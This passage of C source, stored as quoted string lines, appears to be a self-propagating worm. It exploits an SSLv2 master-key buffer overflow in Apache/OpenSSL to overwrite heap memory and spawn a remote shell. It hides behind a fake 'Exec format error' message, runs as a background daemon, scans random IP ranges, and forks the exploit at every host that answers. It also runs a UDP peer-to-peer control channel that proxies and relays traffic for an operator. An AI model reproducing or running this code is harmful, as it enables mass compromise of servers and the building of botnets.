            "\tint to_read = len;",
            "\tdo {",
            "\t\tif ((l = read(sock, buf, to_read)) < 0) exit(1);",
            "\t\tto_read -= len;",
            "\t} while (to_read > 0);",
            "\treturn len;",
            "int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {",
            "\tint rec_len, padding;",
            "\tread_data(ssl->sock, buf, 2);",
            "\tif ((buf[0] & 0x80) == 0) {",
            "\t\trec_len = ((buf[0] & 0x3f) << 8) | buf[1];",
            "\t\tread_data(ssl->sock, &buf[2], 1);",
            "\t\tpadding = (int)buf[2];",
            "\telse {",
            "\t\trec_len = ((buf[0] & 0x7f) << 8) | buf[1];",
            "\t\tpadding = 0;",
            "\tif ((rec_len <= 0) || (rec_len > buf_size)) exit(1);",
            "\tread_data(ssl->sock, buf, rec_len);",
            "\tif (ssl->encrypted) {",
            "\t\tif (MD5_DIGEST_LENGTH + padding >= rec_len) {",
            "\t\t\tif ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;",
            "\t\t\telse exit(1);",
            "\t\tRC4(ssl->rc4_read_key, rec_len, buf, buf);",
            "\t\trec_len = rec_len - MD5_DIGEST_LENGTH - padding;",
            "\t\tmemmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);",
            "\tif (buf[0] == SSL2_MT_ERROR) {",
            "\t\tif (rec_len != 3) exit(1);",
            "\t\telse return 0;",
            "\treturn rec_len;",
            "void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tunsigned char* p;",
            "\tint tot_len;",
            "\tMD5_CTX ctx;",
            "\tint seq;",
            "\tif (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;",
            "\telse tot_len = rec_len;",
            "\tif (2 + tot_len > BUFSIZE) exit(1);",
            "\tp = buf;",
            "\ts2n(tot_len, p);",
            "\tbuf[0] = buf[0] | 0x80;",
            "\tif (ssl->encrypted) {",
            "\t\tseq = ntohl(ssl->write_seq);",
            "\t\tMD5_Init(&ctx);",
            "\t\tMD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);",
            "\t\tMD5_Update(&ctx, rec, rec_len);",
            "\t\tMD5_Update(&ctx, &seq, 4);",
            "\t\tMD5_Final(p, &ctx);",
            "\t\tp+=MD5_DIGEST_LENGTH;",
            "\t\tmemcpy(p, rec, rec_len);",
            "\t\tRC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);",
            "\telse memcpy(p, rec, rec_len);",
            "\tsend(ssl->sock, buf, 2 + tot_len, 0);",
            "\tssl->write_seq++;",
            "void send_client_hello(ssl_conn *ssl) {",
            "\tint i;",
            "\tunsigned char buf[BUFSIZE] =",
            "\t\t\"\\x01\"",
            "\t\t\"\\x00\\x02\"",
            "\t\t\"\\x00\\x18\"",
            "\t\t\"\\x00\\x00\"",
            "\t\t\"\\x00\\x10\"",
            "\t\t\"\\x07\\x00\\xc0\\x05\\x00\\x80\\x03\\x00\"",
            "\t\t\"\\x80\\x01\\x00\\x80\\x08\\x00\\x80\\x06\"",
            "\t\t\"\\x00\\x40\\x04\\x00\\x80\\x02\\x00\\x80\"",
            "\t\t\"\";",
            "\tfor (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);",
            "\tmemcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);",
            "\tsend_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);",
            "void get_server_hello(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tunsigned char *p, *end;",
            "\tint len;",
            "\tint server_version, cert_length, cs_length, conn_id_length;",
            "\tint found;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (len < 11) exit(1);",
            "\tp = buf;",
            "\tif (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);",
            "\tif (*(p++) != 0) exit(1);",
            "\tif (*(p++) != 1) exit(1);",
            "\tn2s(p, server_version);",
            "\tif (server_version != 2) exit(1);",
            "\tn2s(p, cert_length);",
            "\tn2s(p, cs_length);",
            "\tn2s(p, conn_id_length);",
            "\tif (len != 11 + cert_length + cs_length + conn_id_length) exit(1);",
            "\tssl->x509 = NULL;",
            "\tssl->x509=d2i_X509(NULL,&p,(long)cert_length);",
            "\tif (ssl->x509 == NULL) exit(1);",
            "\tif (cs_length % 3 != 0) exit(1);",
            "\tfound = 0;",
            "\tfor (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;",
            "\tif (!found) exit(1);",
            "\tif (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);",
            "\tssl->conn_id_length = conn_id_length;",
            "\tmemcpy(ssl->conn_id, p, conn_id_length);",
            "void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {",
            "\tint encrypted_key_length, key_arg_length, record_length;",
            "\tunsigned char* p;",
            "\tint i;",
            "\tEVP_PKEY *pkey=NULL;",
            "\tunsigned char buf[BUFSIZE] =",
            "\t\t\"\\x02\"",
            "\t\t\"\\x01\\x00\\x80\"",
            "\t\t\"\\x00\\x00\"",
            "\t\t\"\\x00\\x40\"",
            "\t\t\"\\x00\\x08\";",
            "\tp = &buf[10];",
            "\tfor (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);",
            "\tpkey=X509_get_pubkey(ssl->x509);",
            "\tif (!pkey) exit(1);",
            "\tif (pkey->type != EVP_PKEY_RSA) exit(1);",
            "\tencrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);",
            "\tif (encrypted_key_length <= 0) exit(1);",
            "\tp += encrypted_key_length;",
            "\tif (key_arg_overwrite) {",
            "\t\tfor (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);",
            "\t\tmemcpy(p, key_arg_overwrite, key_arg_overwrite_len);",
            "\t\tkey_arg_length = 8 + key_arg_overwrite_len;",
            "\telse key_arg_length = 0;",
            "\tp = &buf[6];",
            "\ts2n(encrypted_key_length, p);",
            "\ts2n(key_arg_length, p);",
            "\trecord_length = 10 + encrypted_key_length + key_arg_length;",
            "\tsend_ssl_packet(ssl, buf, record_length);",
            "\tssl->encrypted = 1;",
            "void generate_key_material(ssl_conn* ssl) {",
            "\tunsigned int i;",
            "\tMD5_CTX ctx;",
            "\tunsigned char *km;",
            "\tunsigned char c='0';",
            "\tkm=ssl->key_material;",
            "\tfor (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {",
            "\t\tMD5_Init(&ctx);",
            "\t\tMD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);",
            "\t\tMD5_Update(&ctx,&c,1);",
            "\t\tc++;",
            "\t\tMD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);",
            "\t\tMD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);",
            "\t\tMD5_Final(km,&ctx);",
            "\t\tkm+=MD5_DIGEST_LENGTH;",
            "void generate_session_keys(ssl_conn* ssl) {",
            "\tgenerate_key_material(ssl);",
            "\tssl->read_key = &(ssl->key_material[0]);",
            "\tssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));",
            "\tRC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);",
            "\tssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);",
            "\tssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));",
            "\tRC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);",
            "void get_server_verify(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (len != 1 + CHALLENGE_LENGTH) exit(1);",
            "\tif (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);",
            "\tif (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);",
            "void send_client_finished(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tbuf[0] = SSL2_MT_CLIENT_FINISHED;",
            "\tmemcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);",
            "\tsend_ssl_packet(ssl, buf, 1+ssl->conn_id_length);",
            "void get_server_finished(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tint i;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);",
            "\tif (len <= 112) exit(1);",
            "\tcipher = *(int*)&buf[101];",
            "\tciphers = *(int*)&buf[109];",
            "void get_server_error(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tif ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);",
            "void exploit(char *ip) {",
            "\tint port = 443;",
            "\tint i;",
            "\tint arch=-1;",
            "\tint N = 20;",
            "\tssl_conn* ssl1;",
            "\tssl_conn* ssl2;",
            "\tchar *a;",
            "\talarm(3600);",
            "\tif ((a=GetAddress(ip)) == NULL) exit(0);",
            "\tif (strncmp(a,\"Apache\",6)) exit(0);",
            "\tfor (i=0;i<MAX_ARCH;i++) {",
            "\t\tif (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {",
            "\t\t\tarch=i;",
            "\t\t\tbreak;",
            "\tif (arch == -1) arch=9;",
            "\tsrand(0x31337);",
            "\tfor (i=0; i<N; i++) {",
            "\t\tconnect_host(ip, port);",
            "\t\tusleep(100000);",
            "\tssl1 = ssl_connect_host(ip, port);",
            "\tssl2 = ssl_connect_host(ip, port);",
            "\tsend_client_hello(ssl1);",
            "\tget_server_hello(ssl1);",
            "\tsend_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);",
            "\tgenerate_session_keys(ssl1);",
            "\tget_server_verify(ssl1);",
            "\tsend_client_finished(ssl1);",
            "\tget_server_finished(ssl1);",
            "\tport = get_local_port(ssl2->sock);",
            "\toverwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);",
            "\toverwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);",
            "\t*(int*)&overwrite_next_chunk[156] = cipher;",
            "\t*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;",
            "\t*(int*)&overwrite_next_chunk[196] = ciphers + 16;",
            "\tsend_client_hello(ssl2);",
            "\tget_server_hello(ssl2);",
            "\tsend_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);",
            "\tgenerate_session_keys(ssl2);",
            "\tget_server_verify(ssl2);",
            "\tfor (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);",
            "\tsend_client_finished(ssl2);",
            "\tget_server_error(ssl2);",
            "\tsh(ssl2->sock);",
            "\tclose(ssl2->sock);",
            "\tclose(ssl1->sock);",
            "\texit(0);",
            "#endif",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "int main(int argc, char **argv) {",
            "#ifdef SCAN",
            "\tunsigned char a=0,b=0,c=0,d=0;",
            "#endif",
            "\tunsigned long bases,*cpbases;",
            "\tstruct initsrv_rec initrec;",
            "\tint null=open(\"/dev/null\",O_RDWR);",
            "\tuptime=time(NULL);",
            "\tif (argc <= 1) {",
            "\t\tprintf(\"%s: Exec format error. Binary file not executable.\\n\",argv[0]);",
            "\t\treturn 0;",
            "\tsrand(time(NULL)^getpid());",
            "\tmemset((char*)&routes,0,sizeof(struct route_table)*24);",
            "\tmemset(clients,0,sizeof(struct ainst)*CLIENTS*2);",
            "\tif (audp_listen(&udpserver,PORT) != 0) {",
            "\t\tprintf(\"Error: %s\\n\",aerror(&udpserver));",
            "\t\treturn 0;",
            "\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));",
            "\tinitrec.h.tag=0x70;",
            "\tinitrec.h.len=0;",
            "\tinitrec.h.id=0;",
            "\tcpbases=(unsigned long*)malloc(sizeof(unsigned long)*argc);",
            "\tif (cpbases == NULL) {",
            "\t\tprintf(\"Insufficient memory\\n\");",
            "\t\treturn 0;",
            "\tfor (bases=1;bases<argc;bases++) {",
            "\t\tcpbases[bases-1]=aresolve(argv[bases]);",
            "\t\trelay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));",
            "\tnumlinks=0;",
            "\tdup2(null,0);",
            "\tdup2(null,1);",
            "\tdup2(null,2);",
            "\tif (fork()) return 1;",
            "#ifdef SCAN",
            "\ta=classes[rand()%(sizeof classes)];",
            "\tb=rand();",
            "\tc=0;",
            "\td=0;",
            "#endif",
            "\tsignal(SIGCHLD,nas);",
            "\tsignal(SIGHUP,nas);",
            "\twhile (1) {",
            "\t\tstatic unsigned long timeout=0,timeout2=0,timeout3=0;",
            "\t\tchar buf_[3000],*buf=buf_;",
            "\t\tint n=0,p=0;",
            "\t\tlong l=0,i=0;",
            "\t\tunsigned long start=time(NULL);",
            "\t\tfd_set read;",
            "\t\tstruct timeval tm;",
            "\t\tFD_ZERO(&read);",
            "\t\tif (udpserver.sock > 0) FD_SET(udpserver.sock,&read);",
            "\t\tudpserver.len=0;",
            "\t\tl=udpserver.sock;",
            "\t\tfor (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) {",
            "\t\t\tFD_SET(clients[n].sock,&read);",
            "\t\t\tclients[n].len=0;",
            "\t\t\tif (clients[n].sock > l) l=clients[n].sock;",
            "\t\tmemset((void*)&tm,0,sizeof(struct timeval));",
            "\t\ttm.tv_sec=2;",
            "\t\ttm.tv_usec=0;",
            "\t\tl=select(l+1,&read,NULL,NULL,&tm);",
            "\t\tif (l == -1) {",
            "\t\t\tif (errno == EINTR) {",
            "\t\t\t\tfor (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {",
            "\t\t\t\t\tunsigned int *newpids,on;",
            "\t\t\t\t\tfor (on=i+1;on<numpids;on++) pids[on-1]=pids[on];",
            "\t\t\t\t\tpids[on-1]=0;",
            "\t\t\t\t\tnumpids--;",
            "\t\t\t\t\tnewpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));",
            "\t\t\t\t\tif (newpids != NULL) {",
            "\t\t\t\t\t\tfor (on=0;on<numpids;on++) newpids[on]=pids[on];",
            "\t\t\t\t\t\tFREE(pids);",
            "\t\t\t\t\t\tpids=newpids;",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\tcontinue;",
            "\t\ttimeout+=time(NULL)-start;",
            "\t\tif (timeout >= 60) {",
            "\t\t\tif (links == NULL || numlinks == 0) {",
            "\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));",
            "\t\t\t\tinitrec.h.tag=0x70;",
            "\t\t\t\tinitrec.h.len=0;",
            "\t\t\t\tinitrec.h.id=0;",
            "\t\t\t\tfor (i=0;i<bases;i++) relay(cpbases[i],(char*)&initrec,sizeof(struct initsrv_rec));",
            "\t\t\t}",
            "\t\t\telse if (!myip) {",
            "\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));",
            "\t\t\t\tinitrec.h.tag=0x74;",
            "\t\t\t\tinitrec.h.len=0;",
            "\t\t\t\tinitrec.h.id=0;",
            "\t\t\t\tsegment(2,(char*)&initrec,sizeof(struct initsrv_rec));",
            "\t\t\t}",
            "\t\t\ttimeout=0;",
            "\t\ttimeout2+=time(NULL)-start;",
            "\t\tif (timeout2 >= 3) {",
            "\t\t\tstruct mqueue *getqueue=queues;",
            "\t\t\twhile(getqueue != NULL) {",
            "\t\t\t\tif (time(NULL)-getqueue->time > gettimeout()) {",
            "\t\t\t\t\tstruct mqueue *l=getqueue->next;",
            "\t\t\t\t\tdelqueue(getqueue->id);",
            "\t\t\t\t\tdelqueue(getqueue->id);",
            "\t\t\t\t\tgetqueue=l;",
            "\t\t\t\t\tcontinue;",
            "\t\t\t\t}",
            "\t\t\t\telse if ((time(NULL)-getqueue->ltime) >= (getqueue->destination?6:3)) {",
            "\t\t\t\t\tstruct ainst ts;",
            "\t\t\t\t\tchar srv[256];",
            "\t\t\t\t\tunsigned char i;",
            "\t\t\t\t\tmemset((void*)&ts,0,sizeof(struct ainst));",
            "\t\t\t\t\tgetqueue->ltime=time(NULL);",
            "\t\t\t\t\tif (getqueue->destination) {",
            "\t\t\t\t\t\tconv(srv,256,getqueue->destination);",
            "\t\t\t\t\t\taudp_relay(&udpserver,&ts,srv,getqueue->port);",
            "\t\t\t\t\t\taudp_send(&ts,getqueue->packet,getqueue->len);",
            "\t\t\t\t\t}",
            "\t\t\t\t\telse for (i=0;i<getqueue->trys;i++) segment(0,getqueue->packet,getqueue->len);",
            "\t\t\t\t}",
            "\t\t\t\tgetqueue=getqueue->next;",
            "\t\t\t}",
            "\t\t\ttimeout2=0;",
            "\t\ttimeout3+=time(NULL)-start;",
            "\t\tif (timeout3 >= 60*10) {",
            "\t\t\tchar buf[2]={0,0};",
            "\t\t\tsyncmode(1);",
            "\t\t\tbroadcast(buf,1);",
            "\t\t\ttimeout3=0;",
            "\t\tif (udpserver.sock > 0 && FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;",
            "\t\tfor (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;",
            "#ifdef SCAN",
            "\t\tif (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {",
            "\t\t\tchar srv[256];",
            "\t\t\tif (d == 255) {",
            "\t\t\t\tif (c == 255) {",
            "\t\t\t\t\ta=classes[rand()%(sizeof classes)];",
            "\t\t\t\t\tb=rand();",
            "\t\t\t\t\tc=0;",
            "\t\t\t\t}",
            "\t\t\t\telse c++;",
            "\t\t\t\td=0;",
            "\t\t\t}",
            "\t\t\telse d++;",
            "\t\t\tmemset(srv,0,256);",
            "\t\t\tsprintf(srv,\"%d.%d.%d.%d\",a,b,c,d);",
            "\t\t\tclients[n].ext=time(NULL);",
            "\t\t\tatcp_sync_connect(&clients[n],srv,SCANPORT);",
            "\t\t\tp++;",
            "\t\tfor (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {",
            "\t\t\tp=atcp_sync_check(&clients[n]);",
            "\t\t\tif (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);",
            "\t\t\tif (p == ASUCCESS) {",
            "\t\t\t\tchar srv[256];",
            "\t\t\t\tconv(srv,256,clients[n].in.sin_addr.s_addr);",
            "\t\t\t\tif (mfork() == 0) {",
            "\t\t\t\t\texploit(srv);",
            "\t\t\t\t\texit(0);",
            "\t\t\t\t}",
            "\t\t\t}",
            "#endif",
            "\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {",
            "\t\t\tif (clients[n].ext2 == TCP_PENDING) {",
            "\t\t\t\tstruct add_rec rc;",
            "\t\t\t\tmemset((void*)&rc,0,sizeof(struct add_rec));",
            "\t\t\t\tp=atcp_sync_check(&clients[n]);",
            "\t\t\t\tif (p == ACONNECT) {",
            "\t\t\t\t\trc.h.tag=0x42;",
            "\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\trc.h.id=clients[n].ext3;",
            "\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));",
            "\t\t\t\t\tFREE(clients[n].ext);",
            "\t\t\t\t\tFREE(clients[n].ext5);",
            "\t\t\t\t\tatcp_close(&clients[n]);",
            "\t\t\t\t}",
            "\t\t\t\tif (p == ASUCCESS) {",
            "\t\t\t\t\trc.h.tag=0x43;",
            "\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\trc.h.id=clients[n].ext3;",
            "\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));",
            "\t\t\t\t\tclients[n].ext2=TCP_CONNECTED;",
            "\t\t\t\t\tif (clients[n].ext5) {",
            "\t\t\t\t\t\tatcp_send(&clients[n],clients[n].ext5,9);",
            "\t\t\t\t\t\tclients[n].ext2=SOCKS_REPLY;",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\telse if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {",
            "\t\t\t\tstruct add_rec rc;",
            "\t\t\t\tmemset((void*)&rc,0,sizeof(struct add_rec));",
            "\t\t\t\tl=atcp_recv(&clients[n],buf,3000);",
            "\t\t\t\tif (*buf == 0) clients[n].ext2=TCP_CONNECTED;",
            "\t\t\t\telse {",
            "\t\t\t\t\trc.h.tag=0x42;",
            "\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\trc.h.id=clients[n].ext3;",
            "\t\t\t\t\trelayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));",
            "\t\t\t\t\tFREE(clients[n].ext);",
            "\t\t\t\t\tFREE(clients[n].ext5);",
            "\t\t\t\t\tatcp_close(&clients[n]);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\telse if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {",
            "\t\t\t\tstruct data_rec rc;",
            "\t\t\t\tmemset((void*)&rc,0,sizeof(struct data_rec));",
            "\t\t\t\tl=atcp_recv(&clients[n],buf+sizeof(struct data_rec),3000-sizeof(struct data_rec));",
            "\t\t\t\tif (l == AUNKNOWN) {",
            "\t\t\t\t\tstruct kill_rec rc;",
            "\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct kill_rec));",
            "\t\t\t\t\trc.h.tag=0x42;",
            "\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\trc.h.id=clients[n].ext3;",
            "\t\t\t\t\trelayclient((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));",
            "\t\t\t\t\tFREE(clients[n].ext);",
            "\t\t\t\t\tFREE(clients[n].ext5);",
            "\t\t\t\t\tatcp_close(&clients[n]);",
            "\t\t\t\t}",
            "\t\t\t\telse {",
            "\t\t\t\t\tl=clients[n].len;",
            "\t\t\t\t\trc.h.tag=0x41;",
            "\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\trc.h.id=clients[n].ext3;",
            "\t\t\t\t\trc.h.len=l;",
            "\t\t\t\t\t_encrypt(buf+sizeof(struct data_rec),l);",
            "\t\t\t\t\tmemcpy(buf,(void*)&rc,sizeof(struct data_rec));",
            "\t\t\t\t\trelayclient((struct ainst *)clients[n].ext,buf,l+sizeof(struct data_rec));",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\tif (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,buf,3000)) {",
            "\t\t\tstruct llheader *llrp, ll;",
            "\t\t\tstruct header *tmp;",
            "\t\t\tin++;",
            "\t\t\tif (udpserver.len < 0 || udpserver.len < sizeof(struct llheader)) continue;",
            "\t\t\tbuf+=sizeof(struct llheader);",
            "\t\t\tudpserver.len-=sizeof(struct llheader);",
            "\t\t\tllrp=(struct llheader *)(buf-sizeof(struct llheader));",
            "\t\t\ttmp=(struct header *)buf;",
            "\t\t\tif (llrp->type == 0) {",
            "\t\t\t\tmemset((void*)&ll,0,sizeof(struct llheader));",
            "\t\t\t\tif (llrp->checksum != in_cksum(buf,udpserver.len)) continue;",
            "\t\t\t\tif (!usersa(llrp->id)) addrsa(llrp->id);",
            "\t\t\t\telse continue;",
            "\t\t\t\tll.type=1;",
            "\t\t\t\tll.checksum=0;",
            "\t\t\t\tll.id=llrp->id;",
            "\t\t\t\tif (tmp->tag != 0x26) audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));",
            "\t\t\t}",
            "\t\t\telse if (llrp->type == 1) {",
            "\t\t\t\tdelqueue(llrp->id);",
            "\t\t\t\tcontinue;",
            "\t\t\t}",
            "\t\t\telse continue;",
            "\t\t\tif (udpserver.len >= sizeof(struct header)) {",
            "\t\t\t\tswitch(tmp->tag) {",
            "\t\t\t\t\tcase 0x20: { // Info",
            "\t\t\t\t\t\tstruct getinfo_rec *rp=(struct getinfo_rec *)buf;",
            "\t\t\t\t\t\tstruct info_rec rc;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct getinfo_rec)) break;",
            "\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct info_rec));",
            "\t\t\t\t\t\trc.h.tag=0x47;",
            "\t\t\t\t\t\trc.h.id=tmp->id;",
            "\t\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\t\trc.h.len=0;",
            "#ifdef SCAN",
            "\t\t\t\t\t\trc.a=a;",
            "\t\t\t\t\t\trc.b=b;",
            "\t\t\t\t\t\trc.c=c;",
            "\t\t\t\t\t\trc.d=d;",
            "#endif",
            "\t\t\t\t\t\trc.ip=myip;",
            "\t\t\t\t\t\trc.uptime=time(NULL)-uptime;",
            "\t\t\t\t\t\trc.in=in;",
            "\t\t\t\t\t\trc.out=out;",
            "\t\t\t\t\t\trc.version=VERSION;",
            "\t\t\t\t\t\trc.reqtime=rp->time;",
            "\t\t\t\t\t\trc.reqmtime=rp->mtime;",
            "\t\t\t\t\t\trelayclient(&udpclient,(char*)&rc,sizeof(struct info_rec));",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x21: { // Open a bounce",
            "\t\t\t\t\t\tstruct add_rec *sr=(struct add_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct add_rec)) break;",
            "\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {",
            "\t\t\t\t\t\t\tchar srv[256];",
            "\t\t\t\t\t\t\tif (sr->socks == 0) conv(srv,256,sr->server);",
            "\t\t\t\t\t\t\telse conv(srv,256,sr->socks);",
            "\t\t\t\t\t\t\tclients[n].ext2=TCP_PENDING;",
            "\t\t\t\t\t\t\tclients[n].ext3=sr->h.id;",
            "\t\t\t\t\t\t\tclients[n].ext=(struct ainst*)malloc(sizeof(struct ainst));",
            "\t\t\t\t\t\t\tif (clients[n].ext == NULL) {",
            "\t\t\t\t\t\t\t\tclients[n].sock=0;",
            "\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tmemcpy((void*)clients[n].ext,(void*)&udpclient,sizeof(struct ainst));",
            "\t\t\t\t\t\t\tif (sr->socks == 0) {",
            "\t\t\t\t\t\t\t\tclients[n].ext5=NULL;",
            "\t\t\t\t\t\t\t\tatcp_sync_connect(&clients[n],srv,sr->port);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\tclients[n].ext5=(char*)malloc(9);",
            "\t\t\t\t\t\t\t\tif (clients[n].ext5 == NULL) {",
            "\t\t\t\t\t\t\t\t\tclients[n].sock=0;",
            "\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[0]=0x04;",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[1]=0x01;",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];",
            "\t\t\t\t\t\t\t\t((char*)clients[n].ext5)[8]=0x00;",
            "\t\t\t\t\t\t\t\tatcp_sync_connect(&clients[n],srv,1080);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (sr->bind) abind(&clients[n],sr->bind,0);",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x22: { // Close a bounce",
            "\t\t\t\t\t\tstruct kill_rec *sr=(struct kill_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct kill_rec)) break;",
            "\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {",
            "\t\t\t\t\t\t\tFREE(clients[n].ext);",
            "\t\t\t\t\t\t\tFREE(clients[n].ext5);",
            "\t\t\t\t\t\t\tatcp_close(&clients[n]);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x23: { // Send a message to a bounce",
            "\t\t\t\t\t\tstruct data_rec *sr=(struct data_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct data_rec)+sr->h.len) break;",
            "\t\t\t\t\t\tfor (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {",
            "\t\t\t\t\t\t\t_decrypt(buf+sizeof(struct data_rec),sr->h.len);",
            "\t\t\t\t\t\t\tatcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "#ifndef LARGE_NET",
